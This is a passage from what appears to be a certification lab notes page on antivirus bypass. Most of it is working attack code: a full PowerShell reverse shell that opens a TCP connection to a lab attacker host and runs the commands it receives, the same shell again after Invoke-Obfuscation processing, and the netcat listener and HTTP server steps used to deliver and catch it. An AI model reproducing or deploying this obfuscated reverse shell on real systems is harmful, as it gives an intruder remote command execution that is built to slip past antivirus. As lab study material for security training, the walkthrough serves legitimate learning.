$client = New-Object System.Net.Sockets.TCPClient('192.168.31.128',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

* Back in `Invoke-Obfuscation`

```bash
SET SCRIPTPATH /home/kali/certs/ejpt/AVBypass/shell.ps1
AST
ALL
1
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-7036c78eb5f1ca9a268c3a6b577885010d3ca38f%252Fimage-20230424173718594.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=cfe6ced&#x26;sv=1" alt=""><figcaption></figcaption></figure>

* Obfuscated code is:

```bash
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.31.128',4242));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
cd /home/kali/certs/ejpt/AVBypass/    
nano obfuscated.ps1
```

```bash
# Attacker VM another terminal
cd /home/kali/certs/ejpt/AVBypass/
sudo python -m http.server 80

nc -nvlp 4242
```

* Run the `obfuscated.ps1` file on the Win10 VM

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-3bc883e35737e5b8792ae32b2da164a52a9c6cbb%252Fimage-20230424174516223.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=5c14ea08&#x26;sv=1" alt=""><figcaption></figcaption></figure>

* Back on the Kali VM check the PowerShell reverse shell

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-3ce3933a3d9280c7e999e406c431acdb4826958b%252Fimage-20230424174638022.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=ab98ac3e&#x26;sv=1" alt=""><figcaption><p>PowerShell reverse shell</p></figcaption></figure>
